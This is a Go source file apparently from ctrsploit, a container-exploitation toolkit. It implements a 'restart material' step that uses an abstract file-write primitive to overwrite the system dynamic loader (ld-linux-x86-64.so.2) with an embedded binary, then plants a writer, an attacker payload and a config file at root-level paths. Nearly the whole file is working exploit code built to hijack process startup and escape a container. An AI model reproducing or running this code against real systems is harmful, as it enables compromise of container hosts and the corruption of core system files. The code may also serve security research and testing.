package pipeprimitive

import (
	_ "embed"
	"fmt"
	"os"
)

type restartMaterialPaths struct {
	writer    string
	payload   string
	primitive string
	loaders   []string
}

//go:embed material/restart-loader-amd64.bin
var restartLoaderLinuxAMD64 []byte

var restartPaths = restartMaterialPaths{
	writer:    "/writer",
	payload:   "/payload",
	primitive: "/ctrsploit-restart-primitive",
	loaders: []string{
		"/lib64/ld-linux-x86-64.so.2",
		"/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
	},
}

func WriteRestartMaterial(primitive Primitive, payload []byte) error {
	return writeRestartMaterial(primitive, payload, restartPaths)
}

func writeRestartMaterial(primitive Primitive, payload []byte, paths restartMaterialPaths) error {
	provider, ok := primitive.(RestartWriterProvider)
	if !ok {
		return fmt.Errorf("%s does not provide a restart writer", primitive.GetExpName())
	}
	writer := provider.RestartWriter()
	if len(writer) == 0 {
		return fmt.Errorf("restart writer is empty")
	}

	loader := restartLoaderPayload()
	if len(loader) == 0 {
		return fmt.Errorf("restart loader is unsupported on this platform")
	}

	writtenLoader := false
	for _, target := range paths.loaders {
		if _, err := os.Stat(target); err != nil {
			if os.IsNotExist(err) {
				continue
			}
			return fmt.Errorf("stat restart loader %q: %w", target, err)
		}
		if err := WriteImage(primitive, target, loader); err != nil {
			return fmt.Errorf("write restart loader %q: %w", target, err)
		}
		writtenLoader = true
	}
	if !writtenLoader {
		return fmt.Errorf("no supported restart loader path exists")
	}
	if err := WriteImage(primitive, paths.writer, writer); err != nil {
		return fmt.Errorf("write restart writer %q: %w", paths.writer, err)
	}
	if err := WriteImage(primitive, paths.payload, payload); err != nil {
		return fmt.Errorf("write restart payload %q: %w", paths.payload, err)
	}
	config := []byte(fmt.Sprintf("%s\n%d\n", primitive.GetExpName(), len(payload)))
	if err := WriteImage(primitive, paths.primitive, config); err != nil {
		return fmt.Errorf("write restart primitive config %q: %w", paths.primitive, err)
	}
	return nil
}

func restartLoaderPayload() []byte {
	return restartLoaderLinuxAMD64
}
